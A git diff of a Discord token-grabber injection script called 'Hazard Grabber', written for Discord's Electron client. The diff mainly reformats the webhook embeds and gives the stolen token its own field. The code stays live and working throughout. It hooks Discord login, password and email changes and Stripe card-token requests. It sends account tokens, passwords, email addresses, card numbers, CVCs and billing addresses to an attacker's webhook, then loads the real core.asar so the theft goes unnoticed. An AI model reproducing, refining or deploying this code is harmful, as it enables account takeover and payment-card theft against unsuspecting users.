@@ -13,9 +13,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     k({ cancel: false, responseHeaders: j.responseHeaders }); 
   }); 
 
-
-
-
   var webhook = "%WEBHOOK_LINK%";
   
   function FirstTime(){
@@ -52,7 +49,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
   
   }})
   
-  
   function SendToWebhook(what) {
     const window = BrowserWindow.getAllWindows()[0];
 
@@ -67,7 +63,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
 
   }
-  
   
   function GetNitro(flags){
       if (flags == 0){
@@ -135,8 +130,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
   
   }
   
-  
-  
   function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
 
@@ -159,12 +152,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             content: "",
             embeds: [
                 {
-                    "title": "Hazard Grabber",
                     "color": 16507654,
-                    "author": {
-                        "name": json.username +"#" + json.discriminator,
-                        "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
-                    },
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -173,24 +161,30 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `**Nitro Type:**: ${GetNitro(json.premium_type)}\n**Badges:** ${GetBadges(json.flags)}\n**Token:** ${token}`,
+                            "value": `**Nitro Type:**: ${GetNitro(json.premium_type)}\n**Badges:** ${GetBadges(json.flags)}`,
                             "inline": true
+                        },
+                        {
+                            "name": "**Token**",
+                            "value": token,
+                            "inline": false
                         }
                     ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator,
+                        "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
+                    },
                     "footer": {
                         "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
-                    }                
+                    }
                 }
             ]
         }
 
         SendToWebhook(JSON.stringify(params));
 
-
-    
     })})
 }
-  
   
   function ChangePassword(oldpassword, newpassword, token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -216,10 +210,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                     {
                         "title": "Password Changed",
                         "color": 16507654,
-                        "author": {
-                            "name": json.username +"#" + json.discriminator,
-                            "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
-                        },
                         "fields": [
                             {
                                 "name": "**Account Info**",
@@ -228,10 +218,19 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                             },
                             {
                                 "name": "**Other Info**",
-                                "value": `**Nitro Type:**: ${GetNitro(json.premium_type)}\n**Badges:** ${GetBadges(json.flags)}\n**Token:** ${token}`,
+                                "value": `**Nitro Type:**: ${GetNitro(json.premium_type)}\n**Badges:** ${GetBadges(json.flags)}`,
                                 "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": token,
+                                "inline": false
                             }
                         ],
+                        "author": {
+                            "name": json.username +"#" + json.discriminator,
+                            "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
+                        },
                         "footer": {
                             "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                         }                 
@@ -243,15 +242,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         })
     }));
 
-  
-  
-  
-  
-  
-  
-  
-  
-  
   }
   
   function ChangeEmail(newemail, password, token) {
@@ -278,10 +268,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                 {
                     "title": "Email Changed",
                     "color": 16507654,
-                    "author": {
-                        "name": json.username +"#" + json.discriminator,
-                        "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
-                    },
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -290,10 +276,19 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `**Nitro Type:**: ${GetNitro(json.premium_type)}\n**Badges:** ${GetBadges(json.flags)}\n**Token:** ${token}`,
+                            "value": `**Nitro Type:**: ${GetNitro(json.premium_type)}\n**Badges:** ${GetBadges(json.flags)}`,
                             "inline": true
+                        },
+                        {
+                            "name": "**Token**",
+                            "value": token,
+                            "inline": false
                         }
                     ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator,
+                        "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
+                    },
                     "footer": {
                         "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                     }                
@@ -304,11 +299,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
     })})
       
-  
-  
-      
   }
-  
   
   function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
   
@@ -343,8 +334,13 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `**Nitro Type:**: ${GetNitro(json.premium_type)}\n**Badges:** ${GetBadges(json.flags)}\n**Token:** ${token}`,
+                            "value": `**Nitro Type:**: ${GetNitro(json.premium_type)}\n**Badges:** ${GetBadges(json.flags)}`,
                             "inline": true
+                        },
+                        {
+                            "name": "**Token**",
+                            "value": token,
+                            "inline": false
                         }
                     ],
                     "author": {
@@ -362,12 +358,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
 
     })})
-
-    
-  
-  
-  
-  
   }
   
   const ChangePasswordFilter = {
@@ -379,9 +369,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
           "https://api.stripe.com/v*/tokens"
       ]
   };
-  
-  
-  
   
   session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
       if (details.url.endsWith("login")) {
@@ -434,6 +421,5 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
       }
   
   });
-  
   
   module.exports = require('./core.asar');
